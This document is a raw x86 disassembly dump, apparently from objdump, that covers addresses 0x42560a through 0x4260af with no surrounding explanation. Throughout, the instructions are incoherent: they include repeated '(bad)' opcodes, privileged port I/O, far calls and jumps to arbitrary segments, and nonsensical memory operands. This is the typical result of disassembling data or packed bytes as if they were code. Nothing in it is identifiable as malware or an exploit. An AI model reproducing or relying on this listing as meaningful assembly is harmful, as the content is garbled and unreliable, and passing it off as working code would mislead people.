  42560a:	dec    edx
  42560b:	add    DWORD PTR [esi-0x64731918],edx
  425611:	into   
  425612:	(bad)  
  425613:	clc    
  425614:	inc    ecx
  425615:	mov    edx,0x25ca02a3
  42561a:	push   ecx
  42561b:	push   ecx
  42561c:	daa    
  42561d:	and    edx,edx
  42561f:	jle    0x4255f7
  425621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425622:	(bad)  
  425623:	stc    
  425624:	mov    ds:0x696e6df4,al
  425629:	dec    edx
  42562a:	and    BYTE PTR [edx+0x701d95ad],0xc4
  425631:	dec    ebp
  425632:	mov    ebp,0xcaee60bc
  425637:	jecxz  0x425638
  425639:	jmp    0xd087bc94
  42563e:	xchg   ebp,eax
  42563f:	pop    esp
  425640:	fild   WORD PTR [ecx]
  425642:	dec    esi
  425643:	ss out 0x45,eax
  425646:	popf   
  425647:	rol    DWORD PTR [ebp-0x12],1
  42564a:	push   edi
  42564b:	cmp    dh,BYTE PTR [ebx+0x1a]
  42564e:	xor    DWORD PTR [esi],edi
  425650:	mov    ecx,0xa96ac65a
  425655:	pop    ecx
  425656:	stc    
  425657:	shl    DWORD PTR [eax+ecx*4+0x2c],0x1e
  42565c:	mov    bl,0xa6
  42565e:	pop    edi
  42565f:	call   0xcd6f77d9
  425664:	test   cl,ch
  425666:	ss dec edi
  425668:	pushf  
  425669:	push   esp
  42566a:	push   edi
  42566b:	das    
  42566c:	jne    0x425637
  42566e:	sbb    edx,DWORD PTR [esp+ebx*8-0x22]
  425672:	jle    0x425694
  425674:	inc    ecx
  425675:	out    0xc2,al
  425677:	aad    0xd1
  425679:	fist   WORD PTR [eax+0x60]
  42567c:	std    
  42567d:	call   0x6862:0xa7b92fb3
  425684:	jge    0x42566a
  425686:	fcom   QWORD PTR [esi+0x17]
  425689:	imul   eax,DWORD PTR [esi],0x76ae334a
  42568f:	(bad)  
  425690:	aaa    
  425691:	js     0x42570d
  425693:	jbe    0x4256a3
  425695:	std    
  425696:	adc    BYTE PTR [ebx],cl
  425698:	fbstp  TBYTE PTR es:[edi]
  42569b:	mov    edi,0x62c35645
  4256a0:	pop    esp
  4256a1:	mov    ebx,DWORD PTR [ecx*4-0x5992208c]
  4256a8:	(bad)  
  4256a9:	(bad)  
  4256aa:	js     0x42564d
  4256ac:	std    
  4256ad:	sub    al,BYTE PTR [ebx]
  4256af:	xor    DWORD PTR [ecx-0x64],esp
  4256b2:	add    eax,0x1915
	...
  425713:	add    BYTE PTR [eax],al
  425715:	add    dh,dl
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx+0x64aa4d60],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	sti    
  42572f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425730:	mov    esi,0x830c7b80
  425735:	cwde   
  425736:	adc    DWORD PTR [eax+0x77],esp
  425739:	loope  0x42570a
  42573b:	(bad)  
  42573c:	adc    eax,0x1f87c327
  425741:	outs   dx,BYTE PTR ds:[esi]
  425742:	sbb    DWORD PTR [edi+0x33],esi
  425745:	les    esp,FWORD PTR [esi]
  425747:	leavew 
  425749:	adc    BYTE PTR [edx-0x1c],0xa4
  42574d:	popf   
  42574e:	(bad)  
  42574f:	icebp  
  425750:	(bad)  
  425751:	jns    0x42573c
  425753:	dec    esi
  425754:	jmp    0x425708
  425756:	pop    es
  425757:	inc    ecx
  425758:	and    al,0x82
  42575a:	pop    es
  42575b:	mov    esp,0x7e47503f
  425760:	xor    DWORD PTR ds:0x5e55eb5a,esi
  425766:	add    DWORD PTR [ebx],ebx
  425768:	(bad)  
  425769:	(bad)  
  42576b:	out    dx,al
  42576c:	mov    esp,0xf5fc9ae4
  425771:	(bad)  
  425772:	or     al,0x6a
  425774:	leave  
  425775:	push   0x3d
  425777:	or     BYTE PTR [ebx],0xa0
  42577a:	inc    ebx
  42577b:	mov    al,ds:0x72a78c1c
  425780:	mov    ecx,0x8d010e6d
  425785:	fwait
  425786:	add    DWORD PTR [ecx],ebx
  425788:	inc    eax
  425789:	inc    eax
  42578a:	mov    sp,0x26c9
  42578e:	stc    
  42578f:	dec    esp
  425790:	mov    al,0xff
  425792:	jmp    DWORD PTR [ecx+0x3df27d02]
  425798:	fimul  WORD PTR [edx-0x7eaec4]
  42579e:	in     eax,0x47
  4257a0:	shr    BYTE PTR [ecx+0x611fd548],cl
  4257a6:	jnp    0x42575b
  4257a8:	or     cl,BYTE PTR [eax]
  4257aa:	push   0x71
  4257ac:	cld    
  4257ad:	sbb    BYTE PTR [edi+ebp*2+0x2c621213],bh
  4257b4:	test   BYTE PTR [eax-0x74],bh
  4257b7:	or     BYTE PTR [esi+0x1eacc1af],0xd3
  4257be:	push   es
  4257bf:	fs jge 0x4257cb
  4257c2:	add    ecx,DWORD PTR [ecx-0x24]
  4257c5:	inc    esi
  4257c6:	add    edx,DWORD PTR [ecx]
  4257c8:	jmp    0xa42cef32
  4257cd:	dec    eax
  4257ce:	pop    edi
  4257cf:	in     al,dx
  4257d0:	call   0x398d:0xd7c891a7
  4257d7:	jbe    0x4257fa
  4257d9:	push   0x8
  4257db:	jae    0x425815
  4257dd:	push   esi
  4257de:	pop    ebx
  4257df:	push   eax
  4257e0:	mov    ah,0xc3
  4257e2:	leave  
  4257e3:	(bad)  
  4257e4:	mov    bh,0xdf
  4257e6:	outs   dx,BYTE PTR ds:[esi]
  4257e7:	fadd   st,st(4)
  4257e9:	outs   dx,BYTE PTR ds:[esi]
  4257ea:	sbb    al,0xd8
  4257ec:	or     al,BYTE PTR [edi]
  4257ee:	or     eax,0xfdbaff11
  4257f3:	loop   0x4257fa
  4257f5:	xor    al,0x37
  4257f7:	jbe    0x425811
  4257f9:	mov    ebx,0x2d3d3ee9
  4257fe:	hlt    
  4257ff:	jmp    esp
  425801:	(bad)  
  425802:	retf   0x116b
  425805:	fistp  DWORD PTR [esi]
  425807:	std    
  425808:	mov    dh,0x33
  42580a:	outs   dx,DWORD PTR ds:[esi]
  42580b:	pop    edi
  42580c:	jno    0x4257c6
  42580e:	lahf   
  42580f:	daa    
  425810:	push   esi
  425811:	or     ch,BYTE PTR [ebx-0x10]
  425814:	inc    ecx
  425815:	ds pushf 
  425817:	ret    
  425818:	jge    0x4257ad
  42581a:	mov    eax,0x8749a123
  42581f:	dec    esp
  425820:	lds    edx,FWORD PTR [ebp+0x393c6fd1]
  425826:	cdq    
  425827:	enter  0xb1ae,0x16
  42582b:	xor    al,0x20
  42582d:	mov    dl,0x95
  42582f:	popf   
  425830:	loop   0x425811
  425832:	pushf  
  425833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425834:	push   esp
	...
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0x20fc9f45,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	popf   
  4258af:	ds repz mov edi,0xa39db0ef
  4258b6:	scas   eax,DWORD PTR es:[edi]
  4258b7:	inc    esp
  4258b8:	mov    ch,0xe
  4258ba:	retf   0x79df
  4258bd:	xor    dl,ah
  4258bf:	cmp    BYTE PTR [edi-0xbe0a61f],0xc6
  4258c6:	int3   
  4258c7:	hlt    
  4258c8:	add    eax,0x787ef1f6
  4258cd:	and    BYTE PTR [ebx+0x794ad370],bh
  4258d3:	test   BYTE PTR [ebx+0x31],cl
  4258d6:	jmp    0xec14:0x4bccf0a
  4258dd:	sub    DWORD PTR [edx+0x6bb9fde7],ecx
  4258e3:	add    BYTE PTR [ecx],dl
  4258e5:	add    eax,0xb398904b
  4258ea:	ret    
  4258eb:	xchg   ebx,eax
  4258ec:	and    BYTE PTR [eax+0x67],dh
  4258ef:	in     al,dx
  4258f0:	and    ebx,edi
  4258f2:	out    0xb1,eax
  4258f4:	test   BYTE PTR ds:0x533f0379,bl
  4258fa:	gs add al,0xf9
  4258fd:	repnz and dx,WORD PTR [ebx]
  425901:	outs   dx,BYTE PTR ds:[esi]
  425902:	daa    
  425903:	add    DWORD PTR [ecx-0x4d1829c5],edi
  425909:	add    dl,BYTE PTR [ecx+0x39]
  42590c:	out    0xd5,eax
  42590e:	xor    al,0xb7
  425910:	fsubrp st(4),st
  425912:	lods   eax,DWORD PTR ds:[esi]
  425913:	out    0xb9,al
  425915:	add    eax,0x64bd37e3
  42591a:	xor    ebx,DWORD PTR cs:[ebp+ecx*2-0x73]
  42591f:	cmp    ebp,ecx
  425921:	popa   
  425922:	arpl   WORD PTR [esi+0x2],sp
  425925:	add    BYTE PTR [esi+0x6b],ah
  425928:	mov    al,ds:0x8126f404
  42592d:	pop    ds
  42592e:	jmp    DWORD PTR [esi+0x57]
  425931:	fld    DWORD PTR [ebp+0x27]
  425934:	nop
  425935:	xchg   edx,eax
  425936:	push   ebp
  425937:	xor    eax,0x1a7efb72
  42593c:	add    BYTE PTR [ebx-0x17e38be3],0x4f
  425943:	nop
  425944:	inc    esi
  425945:	and    BYTE PTR [ecx+0x6bdb211a],bh
  42594b:	outs   dx,BYTE PTR ds:[esi]
  42594c:	loope  0x4259b0
  42594e:	or     al,0xd8
  425950:	ret    
  425951:	ret    0xbd4
  425954:	mov    ds,WORD PTR [esi-0x56]
  425957:	mov    eax,ds:0x9ab1708a
  42595c:	out    0xce,al
  42595e:	stos   DWORD PTR es:[edi],eax
  42595f:	cmp    esi,ebp
  425961:	jg     0x425967
  425963:	add    DWORD PTR [edi-0x52347b81],ebp
  425969:	test   eax,0x185a5dba
  42596e:	adc    al,0x34
  425970:	pop    ebp
  425971:	pop    es
  425972:	or     BYTE PTR [eax-0x7d],dh
  425975:	sbb    eax,0x9787d555
  42597a:	inc    edi
  42597b:	mov    bh,0x31
  42597d:	push   ss
  42597e:	xor    bh,bl
  425980:	cmp    BYTE PTR [ecx+edx*1+0x5c],dl
  425984:	adc    edx,esi
  425986:	inc    DWORD PTR [eax-0x76]
  425989:	ins    BYTE PTR es:[edi],dx
  42598a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42598b:	outs   dx,DWORD PTR ds:[esi]
  42598c:	sbb    eax,0x2e5b39cf
  425991:	ret    0x5872
  425994:	mov    ebx,0xc83574d
  425999:	inc    edi
  42599a:	cmp    BYTE PTR [edi],dh
  42599c:	mov    eax,ds:0xe0d296cd
  4259a1:	mov    esi,0x75352438
  4259a6:	stos   BYTE PTR es:[edi],al
  4259a7:	loopne 0x4259c5
  4259a9:	loop   0x42595c
  4259ab:	sub    eax,0x67af2359
  4259b0:	xchg   esp,eax
  4259b1:	jb     0x42599c
  4259b3:	sbb    cl,bh
	...
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x362afe11
  425a24:	add    al,0xdd
  425a26:	sbb    BYTE PTR [ecx+0x1070001],dl
  425a2c:	add    BYTE PTR [eax],al
  425a2e:	arpl   WORD PTR [edx+0x58],bx
  425a31:	jmp    0xc1f6:0x26c44b9d
  425a38:	mov    eax,ds:0x73c02bc3
  425a3d:	imul   BYTE PTR [edi+0x2e]
  425a40:	cwde   
  425a41:	clc    
  425a42:	jbe    0x425a99
  425a44:	cmp    DWORD PTR [eax+0x7b0738df],0x729a54fc
  425a4e:	adc    DWORD PTR [ebp+0x47763d0f],esi
  425a54:	mov    dh,0xe8
  425a56:	ret    
  425a57:	test   al,0x52
  425a59:	call   0xd7ce:0x55c93bad
  425a60:	or     BYTE PTR ds:0x7969ac4b,0x92
  425a67:	or     al,0x53
  425a69:	shr    BYTE PTR [ebp-0x43cb6ae8],cl
  425a6f:	repnz rcr BYTE PTR [esi],0x6a
  425a73:	ret    0x75d8
  425a76:	push   cs
  425a77:	xchg   BYTE PTR [eax+0x5d020ba5],ah
  425a7d:	jg     0x425a5e
  425a7f:	in     al,0xa2
  425a81:	cmp    esi,esp
  425a83:	mov    BYTE PTR [edx+0x243d6d0b],dh
  425a89:	mov    ebp,0x83fced10
  425a8e:	sbb    esp,eax
  425a90:	xchg   ebp,eax
  425a91:	inc    esp
  425a92:	inc    edi
  425a93:	xchg   esp,eax
  425a94:	cdq    
  425a95:	adc    ebp,eax
  425a97:	add    al,0x20
  425a99:	fsub   DWORD PTR ds:0x506185f7
  425a9f:	in     eax,0xad
  425aa1:	add    bl,BYTE PTR [edx+0x7f]
  425aa4:	imul   ecx,DWORD PTR [eax+0x483bf10f],0x66
  425aab:	mov    dh,0xd5
  425aad:	xchg   edx,eax
  425aae:	outs   dx,BYTE PTR ds:[esi]
  425aaf:	fcom   DWORD PTR [edx]
  425ab1:	outs   dx,BYTE PTR ds:[esi]
  425ab2:	jne    0x425a77
  425ab4:	mov    edi,DWORD PTR [edx]
  425ab6:	cmp    ebp,ebp
  425ab8:	and    DWORD PTR [edi],0xffffffe1
  425abb:	sbb    eax,0x8bf0c66d
  425ac0:	push   edi
  425ac1:	mov    BYTE PTR [edi+0x14866cad],bl
  425ac7:	sbb    eax,0xacb63c
  425acc:	mov    eax,0xc88597df
  425ad1:	dec    esi
  425ad2:	shr    DWORD PTR [ebx-0x63],1
  425ad5:	cmp    bl,BYTE PTR ds:[ebx+0x6879db84]
  425adc:	and    al,0x75
  425ade:	daa    
  425adf:	lock cbw 
  425ae2:	retf   
  425ae3:	call   0xc0f:0x668e4b22
  425aea:	sub    al,0x9b
  425aec:	adc    BYTE PTR [eax+0x2a723533],al
  425af2:	xchg   DWORD PTR ds:0xdda36636,esp
  425af8:	test   DWORD PTR [eax-0x13],ebp
  425afb:	push   edi
  425afc:	inc    eax
  425afd:	out    0x3e,eax
  425aff:	inc    ecx
  425b00:	leave  
  425b01:	mov    ds:0x436ead20,al
  425b06:	mov    eax,0x3f835b77
  425b0b:	cld    
  425b0c:	pop    ecx
  425b0d:	(bad)  
  425b0e:	jle    0x425b78
  425b10:	jne    0x425b66
  425b12:	mov    cl,0x3a
  425b14:	ins    DWORD PTR es:[edi],dx
  425b15:	jb     0x425b95
  425b17:	add    esp,0x506aa69b
  425b1d:	lahf   
  425b1e:	cmp    al,0x93
  425b20:	push   ss
  425b21:	imul   DWORD PTR [esi-0x205a1f11]
  425b27:	push   cs
  425b28:	dec    ebx
  425b29:	iret   
  425b2a:	sbb    BYTE PTR [eax-0x41],bh
  425b2d:	(bad)  [ebx]
  425b2f:	ins    BYTE PTR es:[edi],dx
  425b30:	push   ebx
  425b31:	mov    ds:0xd63a5f,al
	...
  425b96:	(bad)  
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x49a5aad3
  425ba3:	(bad)  
  425ba4:	mov    edx,0x1921f09
  425ba9:	add    BYTE PTR [edi],al
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [ebp-0x7be8e098],dh
  425bb3:	add    al,BYTE PTR [ebx+0x4220db44]
  425bb9:	jecxz  0x425bdc
  425bbb:	or     DWORD PTR [eax-0x61],0xffffffa5
  425bbf:	inc    ebx
  425bc0:	mov    edi,0xe19d2da9
  425bc5:	mov    ebx,0x2e8d15e
  425bca:	jbe    0x425b9c
  425bcc:	jo     0x425bbd
  425bce:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  425bd0:	in     eax,0xc7
  425bd2:	in     eax,dx
  425bd3:	(bad)  
  425bd4:	mov    edx,0x48caa80
  425bd9:	fdivr  QWORD PTR [edx+0x1521fab8]
  425bdf:	mov    esp,0xfcc79cfc
  425be4:	(bad)  
  425be5:	jae    0x425c19
  425be7:	push   edi
  425be8:	add    al,0x64
  425bea:	jge    0x425c54
  425bec:	cdq    
  425bed:	sti    
  425bee:	(bad)  
  425bef:	cs out dx,al
  425bf1:	fisubr DWORD PTR [eax-0x33b07a38]
  425bf7:	jmp    0xe100:0x91d32097
  425bfe:	pop    es
  425bff:	rcr    DWORD PTR [ebp+0x5bd3f6c1],1
  425c05:	mov    ds:0xeea8a2e,eax
  425c0a:	inc    ebx
  425c0b:	push   eax
  425c0c:	mov    al,0xed
  425c0e:	mov    cl,BYTE PTR [esi-0x2c87cd3a]
  425c14:	xchg   esp,eax
  425c15:	ror    BYTE PTR [edx],0x7d
  425c18:	add    DWORD PTR [eax+0x53],0xffffff82
  425c1c:	pusha  
  425c1d:	xor    eax,0x95cfc353
  425c22:	mov    bh,0x6f
  425c24:	jo     0x425be6
  425c26:	ja     0x425c0b
  425c28:	mov    edx,0xfeb9f2c4
  425c2d:	mov    eax,ds:0x49388c08
  425c32:	fstp   DWORD PTR [edi]
  425c34:	mov    fs,WORD PTR [edi]
  425c36:	jg     0x425c72
  425c38:	inc    eax
  425c39:	fmul   QWORD PTR [ebx+0x3f03f4c2]
  425c3f:	pop    esi
  425c40:	pop    ds
  425c41:	fcomp  DWORD PTR [esi+ebp*4+0x4ecd7e9]
  425c48:	add    al,bl
  425c4a:	sub    al,0xb1
  425c4c:	inc    esp
  425c4d:	pop    ebp
  425c4e:	or     eax,0x6674b68f
  425c53:	pop    ebx
  425c54:	in     eax,0xdf
  425c56:	mov    ch,0x69
  425c58:	push   es
  425c59:	xchg   esp,edx
  425c5b:	mov    eax,ds:0xf0e8f18e
  425c60:	stos   BYTE PTR es:[edi],al
  425c61:	cmp    dh,BYTE PTR [esi-0x3f300610]
  425c67:	cli    
  425c68:	imul   edx,DWORD PTR [edi+0x7c679a21],0x56
  425c6f:	push   ecx
  425c70:	adc    edx,ecx
  425c72:	pop    ebp
  425c73:	dec    ebx
  425c74:	jmp    0x4c73cf8c
  425c79:	fst    QWORD PTR [edi-0x29]
  425c7c:	mov    ds:0x3b2af010,al
  425c81:	addr16 call 0x7c70:0xdf519ee3
  425c89:	pop    edx
  425c8a:	jge    0x425c14
  425c8c:	dec    ecx
  425c8d:	(bad)  
  425c8e:	push   ss
  425c8f:	add    al,0x95
  425c91:	iret   
  425c92:	push   esi
  425c93:	push   ss
  425c94:	shr    DWORD PTR [eax-0x26],1
  425c97:	pop    edi
  425c98:	cmc    
  425c99:	mov    eax,0xa86c2a8a
  425c9e:	imul   edi,DWORD PTR [edi+0x4c12ab69],0x332428a5
  425ca8:	add    esp,DWORD PTR [esi]
  425caa:	rcr    ecx,0x49
  425cad:	push   ebx
  425cae:	jns    0x425c38
  425cb0:	test   al,0xcf
  425cb2:	scas   eax,DWORD PTR es:[edi]
  425cb3:	(bad)  [eax+eax*1+0x0]
	...
  425d13:	add    BYTE PTR [eax],al
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x5
  425d23:	fld    TBYTE PTR [esp+eax*2+0x26]
  425d27:	xchg   ebx,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    BYTE PTR [edi-0x5fa2d4db],al
  425d33:	pop    esp
  425d34:	xlat   BYTE PTR ds:[ebx]
  425d35:	push   esp
  425d36:	clc    
  425d37:	ins    DWORD PTR es:[edi],dx
  425d38:	xor    bl,BYTE PTR [ecx-0x74]
  425d3b:	lds    ecx,FWORD PTR [edi]
  425d3d:	je     0x425d4d
  425d3f:	sub    dl,BYTE PTR [edi+edi*8]
  425d42:	std    
  425d43:	shr    BYTE PTR [edi+0x26],1
  425d46:	pop    esi
  425d47:	mov    al,ds:0xa88d33cb
  425d4c:	outs   dx,DWORD PTR ds:[esi]
  425d4d:	or     bl,BYTE PTR fs:[eax-0x2fc2aaa8]
  425d54:	ret    
  425d55:	pop    edx
  425d56:	dec    esi
  425d57:	out    0x19,eax
  425d59:	adc    eax,0xe23bdae
  425d5e:	jmp    0x4353:0x8241c045
  425d65:	pop    ecx
  425d66:	push   esi
  425d67:	dec    ebp
  425d68:	mov    ecx,edi
  425d6a:	push   ds
  425d6b:	sub    eax,0x9931cef7
  425d70:	or     BYTE PTR [eax-0x6bffb7aa],dl
  425d76:	add    DWORD PTR [esi+0x557b8872],edx
  425d7c:	arpl   WORD PTR [ecx+0x6c0e9554],ax
  425d82:	add    esp,DWORD PTR [edx+edx*2]
  425d85:	xchg   edx,eax
  425d86:	mov    eax,es
  425d88:	push   ebp
  425d89:	bound  ebx,QWORD PTR [edi-0x30ee4ebd]
  425d8f:	xchg   esi,eax
  425d90:	adc    ax,0x4dc4
  425d94:	popa   
  425d95:	add    edx,DWORD PTR [eax+0x6f51934a]
  425d9b:	cmp    eax,0x417e140d
  425da0:	sub    eax,eax
  425da2:	sub    DWORD PTR [ebp-0x6a],ebp
  425da5:	rcr    DWORD PTR [ebx+0x767555ab],1
  425dab:	call   0x4fdc:0xeb0b01a8
  425db2:	inc    ebx
  425db3:	mov    esp,0xfccb0463
  425db8:	push   edi
  425db9:	push   edx
  425dba:	mov    esi,0xbafaf75f
  425dbf:	retf   0x896a
  425dc2:	rol    bh,1
  425dc4:	inc    edi
  425dc5:	jmp    0x966c:0x1600b7fb
  425dcc:	popa   
  425dcd:	inc    eax
  425dce:	jbe    0x425db5
  425dd0:	into   
  425dd1:	retf   
  425dd2:	adc    eax,0x3809143
  425dd7:	fadd   DWORD PTR [ebx]
  425dd9:	lea    ebx,[esi-0x51393615]
  425ddf:	xor    edi,ebx
  425de1:	cs mov ah,0x3b
  425de4:	neg    BYTE PTR [esi]
  425de6:	push   esp
  425de7:	jmp    0x36ba80a1
  425dec:	sbb    DWORD PTR [eax],0xffffffd9
  425def:	(bad)  
  425df0:	stos   BYTE PTR es:[edi],al
  425df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425df2:	push   esp
  425df3:	jns    0x425e02
  425df5:	in     al,dx
  425df6:	dec    edx
  425df7:	cmp    DWORD PTR fs:0x2cc139d5,0xffffff82
  425dff:	sub    edx,ecx
  425e01:	xor    ch,dl
  425e03:	(bad)  
  425e05:	imul   edi,ecx,0x1c
  425e08:	cmp    ebp,DWORD PTR [edx]
  425e0a:	icebp  
  425e0b:	pop    edx
  425e0c:	loop   0x425e4b
  425e0e:	sbb    eax,0xd67aadfd
  425e13:	lahf   
  425e14:	and    ah,BYTE PTR [ebp+0x2be0f36d]
  425e1a:	test   BYTE PTR [eax+0xb55f9ae],dh
  425e20:	test   esi,ebx
  425e22:	dec    edx
  425e23:	cmp    eax,DWORD PTR [edx]
  425e25:	jmp    0xfca65939
  425e2a:	mov    eax,ds:0x7bbaf864
  425e2f:	iret   
  425e30:	es cmp ecx,ebp
  425e33:	inc    esp
  425e34:	test   al,0x0
	...
  425e96:	(bad)  
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	cwde   
  425ea3:	int    0x31
  425ea5:	loop   0x425ed4
  425ea7:	xchg   esp,eax
  425ea8:	add    DWORD PTR [eax],eax
  425eaa:	pop    es
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    BYTE PTR [esi+0x42843c9b],bl
  425eb3:	or     cl,al
  425eb5:	daa    
  425eb6:	fild   QWORD PTR [edi]
  425eb8:	adc    BYTE PTR [esi+ebx*1+0x536fa1b7],cl
  425ebf:	xor    eax,0xfbac8730
  425ec4:	jle    0x425f1d
  425ec6:	fst    st(1)
  425ec8:	ds out 0xb0,al
  425ecb:	or     DWORD PTR [edx],edx
  425ecd:	popf   
  425ece:	test   al,0x16
  425ed0:	fnstsw WORD PTR [eax+0x34564973]
  425ed6:	push   esi
  425ed7:	int    0x56
  425ed9:	sti    
  425eda:	xchg   ebp,eax
  425edb:	mov    DWORD PTR ds:0x82f2c89e,eax
  425ee1:	xor    eax,0xeb29724e
  425ee6:	mov    bl,0xf6
  425ee8:	pop    ebp
  425ee9:	jge    0x425ef8
  425eeb:	bound  edx,QWORD PTR [edi+ecx*8]
  425eee:	and    eax,0xd87486d6
  425ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ef4:	pop    esp
  425ef5:	(bad)  
  425ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ef7:	out    0x79,eax
  425ef9:	inc    eax
  425efa:	cld    
  425efb:	inc    esp
  425efc:	jne    0x425f70
  425efe:	cmp    eax,0x9489b1d5
  425f03:	jno    0x425f55
  425f05:	lods   eax,DWORD PTR ds:[esi]
  425f06:	hlt    
  425f07:	push   ebx
  425f08:	sbb    DWORD PTR [edi+0x7f2d123b],ebx
  425f0e:	enter  0x1679,0xfd
  425f12:	jmp    edi
  425f14:	pop    eax
  425f15:	es stc 
  425f17:	pushf  
  425f18:	adc    BYTE PTR [edx-0x7b],bl
  425f1b:	test   dh,al
  425f1d:	ds xor ah,cl
  425f20:	sahf   
  425f21:	or     BYTE PTR [eax+edi*2+0x15],bh
  425f25:	xor    al,0xdc
  425f27:	dec    esi
  425f28:	addr16 into 
  425f2a:	lahf   
  425f2b:	jne    0x425f9f
  425f2d:	xlat   BYTE PTR ds:[ebx]
  425f2e:	cli    
  425f2f:	mov    dl,0xcd
  425f31:	sahf   
  425f32:	push   esp
  425f33:	or     BYTE PTR [eax*2-0x65e2dac5],bh
  425f3a:	aaa    
  425f3b:	mov    esp,fs
  425f3d:	paddq  mm3,QWORD PTR [eax]
  425f40:	xor    BYTE PTR [eax-0x104f5768],ch
  425f46:	sbb    eax,0x5e5bfa2d
  425f4b:	scas   eax,DWORD PTR es:[edi]
  425f4c:	jns    0x425fcd
  425f4e:	push   cs
  425f4f:	mov    esi,0x835ed9c9
  425f54:	call   0x29fa4dfd
  425f59:	loopne 0x425eee
  425f5b:	xor    eax,0x1df48487
  425f60:	in     al,0x13
  425f62:	sahf   
  425f63:	add    cl,BYTE PTR [edi-0x76]
  425f66:	jmp    0x6583c974
  425f6b:	sti    
  425f6c:	pop    ss
  425f6d:	and    al,0x90
  425f6f:	enter  0x1f05,0x1e
  425f73:	dec    edi
  425f74:	imul   edi,DWORD PTR [edx-0x9704742],0xe3401a4b
  425f7e:	jle    0x425f75
  425f80:	out    dx,eax
  425f81:	repnz mov esp,fs
  425f84:	cmp    DWORD PTR [edi],eax
  425f86:	push   ebx
  425f87:	sub    cl,BYTE PTR ds:0x193cb29d
  425f8d:	clc    
  425f8e:	fisttp WORD PTR fs:[eax+0x43854626]
  425f95:	mov    al,ds:0xb69ef11
  425f9a:	mov    esi,0xec1f2909
  425f9f:	test   BYTE PTR [ebp-0x666a55bc],dh
  425fa5:	ror    DWORD PTR [edi],0xd1
  425fa8:	adc    eax,0x2e1194a7
  425fad:	xchg   DWORD PTR [ebx],esi
  425faf:	jecxz  0x42602e
  425fb1:	push   es
  425fb2:	lods   al,BYTE PTR ds:[esi]
  425fb3:	aam    0x61
	...
  426015:	add    BYTE PTR [ecx],bh
  426017:	cwde   
  426018:	or     eax,DWORD PTR [esi]
  42601a:	stos   DWORD PTR es:[edi],eax
  42601b:	xchg   edi,eax
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0x1d3b424f
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [edi-0x4b],ch
  426030:	add    BYTE PTR [edx+0x35],0x11
  426034:	dec    ebx
  426035:	sahf   
  426036:	nop
  426037:	imul   BYTE PTR [edi]
  426039:	lods   eax,DWORD PTR ds:[esi]
  42603a:	pop    ecx
  42603b:	(bad)  [eax]
  42603d:	sub    eax,0xd3c1cc7e
  426042:	pushf  
  426043:	or     ah,ah
  426045:	dec    edx
  426046:	test   DWORD PTR [ebx+0x75],ebx
  426049:	pop    ebx
  42604a:	bound  esi,QWORD PTR [ebp+0x167df6d4]
  426050:	ss jp  0x425fd8
  426053:	push   edx
  426054:	(bad)  
  426056:	push   cs
  426057:	dec    esp
  426058:	sahf   
  426059:	sbb    al,0x14
  42605b:	xchg   ecx,eax
  42605c:	mov    esi,0xd04e81d0
  426061:	sbb    ah,BYTE PTR [ebx+0x1a880b5]
  426067:	inc    esp
  426068:	xor    al,0xe4
  42606a:	mov    eax,0x78c3ebef
  42606f:	pop    edi
  426070:	pop    ecx
  426071:	test   ebx,edi
  426073:	loop   0x4260bc
  426075:	mov    cl,0xb9
  426077:	outs   dx,BYTE PTR ds:[esi]
  426078:	or     BYTE PTR [eax-0x75ea9bcb],dl
  42607e:	sbb    eax,0x6cc745d4
  426083:	hlt    
  426084:	or     edi,edx
  426086:	repz push esi
  426088:	leave  
  426089:	jne    0x42608c
  42608b:	push   esp
  42608c:	(bad)  
  42608d:	ja     0x4260c6
  42608f:	add    BYTE PTR [edx+0x3790b8ac],bl
  426095:	(bad)  [edx+0x50]
  426098:	gs mov ecx,0xbfd368ff
  42609e:	or     ebp,DWORD PTR [edx-0x4d]
  4260a1:	push   es
  4260a2:	loop   0x4260f7
  4260a4:	pop    eax
  4260a5:	jne    0x426081
  4260a7:	popf   
  4260a8:	loop   0x426075
  4260aa:	sbb    esi,esi
  4260ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260ad:	mov    ah,0x7f
  4260af:	jmp    0x200d:0x9e18a58e
